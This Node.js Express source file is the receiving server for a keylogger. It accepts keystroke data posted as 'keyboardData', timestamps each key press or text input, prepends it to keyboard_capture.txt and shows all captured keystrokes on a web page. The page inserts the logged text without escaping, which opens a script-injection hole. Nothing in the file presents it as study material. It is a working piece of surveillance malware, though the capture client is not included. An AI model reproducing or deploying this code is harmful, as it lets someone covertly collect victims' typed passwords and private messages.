const fs = require("fs")
const express = require("express")
const bodyParser = require("body-parser")

const app = express()

app.use(bodyParser.json({ extended: true }))

const port = 8080

// When a GET request is made to the "/" resource we return basic HTML.
app.get("/", (req, res) => {
  try {
    const kl_file = fs.readFileSync("./keyboard_capture.txt", {
      encoding: "utf8",
      flag: "r",
    })

    // Split lines, wrap each in `<li>`, and join them back
    const formattedData = kl_file
      .split("\n")
      .filter((line) => line.trim() !== "") // Remove empty lines
      .map((line) => `<li>${line}</li>`)
      .join("")

    // Wrap everything in an unordered list
    res.send(`<h1>Logged Data</h1><ul>${formattedData}</ul>`)
  } catch {
    res.send("<h1>Nothing logged yet.</h1>")
  }
})

app.post("/", (req, res) => {
  console.log(req.body.keyboardData)

  // Get current datetime, formatted as [YYYY-MM-DD HH:mm:ss]
  const timestamp = new Date().toISOString().slice(0, 19).replace("T", " ")

  // Format the log entry
  let newEntry = ""
  const data = req.body.keyboardData

  // Detect whether it's a key press or text input
  if (data.startsWith("Key")) {
    newEntry = `[${timestamp}] - Key pressed: ${data.replace("Key.", "")}`
  } else {
    newEntry = `[${timestamp}] - Input: ${data}`
  }

  // Read the existing content of the file (if it exists)
  let existingContent = ""
  if (fs.existsSync("keyboard_capture.txt")) {
    existingContent = fs.readFileSync("keyboard_capture.txt", "utf8")
  }

  // Prepend the new entry at the top
  const updatedContent = newEntry + "\n" + existingContent

  // Write the updated content back to the file
  fs.writeFileSync("keyboard_capture.txt", updatedContent)

  res.send("Successfully added the data at the top!")
})

app.listen(port, () => {
  console.log(`App is listening on port ${port}`)
})
